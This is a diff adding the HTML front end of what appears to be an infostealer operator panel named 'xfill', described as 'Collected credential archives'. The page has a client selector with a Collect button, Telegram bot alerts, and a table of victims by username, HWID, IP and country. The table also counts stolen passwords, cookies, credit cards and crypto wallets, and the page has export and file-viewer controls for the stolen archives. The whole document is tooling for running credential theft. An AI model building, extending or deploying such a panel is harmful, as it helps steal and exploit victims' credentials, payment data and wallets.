@@ -1,0 +1,109 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>xfill</title>
+    <link rel="stylesheet" href="xfill.css" />
+  </head>
+  <body>
+    <div class="xf-shell">
+      <header class="xf-header">
+        <div>
+          <h1>xfill</h1>
+          <p>Collected credential archives</p>
+        </div>
+        <div class="xf-header-right">
+          <button id="xf-tg-toggle" class="xf-btn"><i class="fa-solid fa-gear"></i><span>Telegram</span></button>
+          <div class="xf-collect">
+            <select id="xf-client-select"><option value="">Loading clients...</option></select>
+            <button id="xf-collect-btn" class="xf-btn primary"><i class="fa-solid fa-bolt"></i><span>Collect</span></button>
+          </div>
+        </div>
+      </header>
+
+      <section id="xf-tg-panel" class="xf-tg-panel hidden">
+        <label class="xf-tg-enabled"><input type="checkbox" id="xf-tg-enabled" /> Enable Telegram notifications</label>
+        <input id="xf-tg-token" type="password" placeholder="Bot token (from @BotFather)" spellcheck="false" />
+        <input id="xf-tg-chat" placeholder="Chat ID" spellcheck="false" />
+        <button id="xf-tg-save" class="xf-btn primary"><span>Save</span></button>
+        <button id="xf-tg-test" class="xf-btn"><span>Send test</span></button>
+        <span id="xf-tg-status" class="xf-tg-status"></span>
+      </section>
+
+      <div id="xf-status" class="xf-status hidden"></div>
+
+      <section class="xf-toolbar">
+        <div class="xf-search">
+          <input id="xf-search-input" placeholder="Search username, HWID, IP, country, note, browser, apps..." spellcheck="false" />
+          <button id="xf-find-btn" class="xf-btn primary"><i class="fa-solid fa-magnifying-glass"></i><span>Find</span></button>
+        </div>
+        <div class="xf-actions">
+          <button id="xf-export-selected" class="xf-btn"><i class="fa-solid fa-file-export"></i><span>Export selected</span></button>
+          <button id="xf-delete-selected" class="xf-btn danger"><i class="fa-solid fa-trash"></i><span>Delete selected</span></button>
+          <button id="xf-export-all" class="xf-btn"><i class="fa-solid fa-file-zipper"></i><span>Export all</span></button>
+          <button id="xf-dedupe" class="xf-btn"><i class="fa-solid fa-clone"></i><span>Delete duplicates</span></button>
+          <button id="xf-rescan" class="xf-btn"><i class="fa-solid fa-rotate"></i><span>Rescan tags</span></button>
+          <button id="xf-delete-seen" class="xf-btn danger"><i class="fa-solid fa-eye-slash"></i><span>Delete seen</span></button>
+          <button id="xf-delete-all" class="xf-btn danger"><i class="fa-solid fa-trash-can"></i><span>Delete all</span></button>
+        </div>
+      </section>
+
+      <div class="xf-table-wrap">
+        <table class="xf-table">
+          <thead>
+            <tr>
+              <th class="xf-col-check"><input type="checkbox" id="xf-check-all" /></th>
+              <th>Time</th>
+              <th>Username</th>
+              <th>HWID</th>
+              <th>Group</th>
+              <th>Note</th>
+              <th>Country</th>
+              <th>IP</th>
+              <th>Version</th>
+              <th class="xf-col-center" title="First time seen">✓</th>
+              <th class="xf-col-center" title="Reviewed">Seen</th>
+              <th class="xf-col-num">Domain Search</th>
+              <th class="xf-col-browser">Browser</th>
+              <th>Extensions</th>
+              <th class="xf-col-num">Passwords</th>
+              <th class="xf-col-num">Cookies</th>
+              <th class="xf-col-num">Credit Cards</th>
+              <th>Wallets</th>
+              <th>Apps</th>
+              <th class="xf-col-actions"></th>
+            </tr>
+          </thead>
+          <tbody id="xf-tbody">
+            <tr><td colspan="20" class="xf-empty">Loading...</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <dialog id="xf-viewer" class="xf-viewer">
+      <div class="xf-viewer-body">
+        <div class="xf-viewer-head">
+          <h2 id="xf-viewer-title">Archive</h2>
+          <button id="xf-viewer-close" class="xf-btn"><i class="fa-solid fa-xmark"></i><span>Close</span></button>
+        </div>
+        <div class="xf-viewer-main">
+          <aside class="xf-tree-pane">
+            <div class="xf-pane-title">Files</div>
+            <div id="xf-tree" class="xf-tree"></div>
+          </aside>
+          <section class="xf-content-pane">
+            <div class="xf-pane-title">
+              <span id="xf-file-name" class="xf-file-name">Select a file</span>
+              <button id="xf-file-download" class="xf-btn hidden"><i class="fa-solid fa-download"></i><span>Download</span></button>
+            </div>
+            <pre id="xf-file-content" class="xf-file-content"></pre>
+          </section>
+        </div>
+      </div>
+    </dialog>
+
+    <script src="xfill.js"></script>
+  </body>
+</html>
